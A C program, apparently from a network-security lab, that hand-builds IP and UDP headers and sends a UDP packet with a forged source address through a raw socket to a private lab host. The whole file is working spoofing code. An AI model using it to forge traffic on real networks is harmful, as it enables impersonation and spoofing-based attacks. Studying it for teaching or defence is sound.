#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

/*UDP Header */
struct udpheader
{
    u_int16_t udp_sport; //Source port
    u_int16_t udp_dport; // Dest port
    u_int16_t udp_ulen;  // udp length
    u_int16_t udp_sum;   // udp checksum
};
/* IP Header */
struct ipheader
{

    unsigned char iph_ihl : 4, iph_ver : 4;           //IP header length, //IP version
    unsigned char iph_tos;                            //Type of service
    unsigned short int iph_len;                       //IP Packet length (data+ header )
    unsigned short int iph_ident;                     //Identification
    unsigned short int iph_flag : 3, iph_offset : 13; //Fragmentation flags //Flags offset
    unsigned char iph_ttl;                            //Time to Live
    unsigned char iph_protocol;                       //Protocol type
    unsigned short int iph_chksum;                    //IP datagram checksum
    struct in_addr iph_sourceip;                      //Source IP address
    struct in_addr iph_destip;                        //Destination IP address
};

void send_raw_ip_packet(struct ipheader *ip);

/******************************************************************
Spoof a UDP packet using an arbitrary source IP Address and port
*******************************************************************/
int main()
{
    char buffer[1500];
    memset(buffer, 0, 1500);
    struct ipheader *ip = (struct ipheader *)buffer;
    struct udpheader *udp = (struct udpheader *)(buffer + sizeof(struct ipheader));
    /**Step 1 : Fill in the UDP data field ***/
    char *data = buffer + sizeof(struct ipheader) + sizeof(struct udpheader);
    const char *msg = "Hello Server! This is Ritik Hariani, the Attacker !\n ";
    int data_len = strlen(msg);
    strncpy(data, msg, data_len);
    /************************** * ******************************
        Step 2 : Fill in the UDP header .
    ********************************************************/
    udp->udp_sport = htons(12345);
    udp->udp_dport = htons(8888);
    udp->udp_ulen = htons(sizeof(struct udpheader) + data_len);
    udp->udp_sum = 0;
    /* Many OSes ignore this field, so we do not calculate it . */
    /*********************************************************
            Step 3 : Fill in the IP header .
    ********************************************************/
    ip->iph_ver = 4;
    ip->iph_ihl = 5;
    ip->iph_ttl = 20;
    ip->iph_sourceip.s_addr = inet_addr("1.2.3.4");
    ip->iph_destip.s_addr = inet_addr("10.0.2.8");
    ip->iph_protocol = IPPROTO_UDP; // The value is 17 .
    ip->iph_len = htons(sizeof(struct ipheader) + sizeof(struct udpheader) + data_len);
    /*********************************************************
        Step 4 : Finally , send the spoofed packet
    ********************************************************/
    send_raw_ip_packet(ip);
    return 0;
}

void send_raw_ip_packet(struct ipheader *ip)
{
    struct sockaddr_in dest_info;
    int enable = 1;
    // Step 1 : Create a raw network socket.
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    // Step 2 : Set socket option .
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));
    // Step 3 : Provide neede d informatio n a bout de stination .
    dest_info.sin_family = AF_INET;
    dest_info.sin_addr = ip->iph_destip;
    // Step 4 : Send the packet out .
    sendto(sock, ip, ntohs(ip->iph_len), 0, (struct sockaddr *)&dest_info, sizeof(dest_info));
    close(sock);
}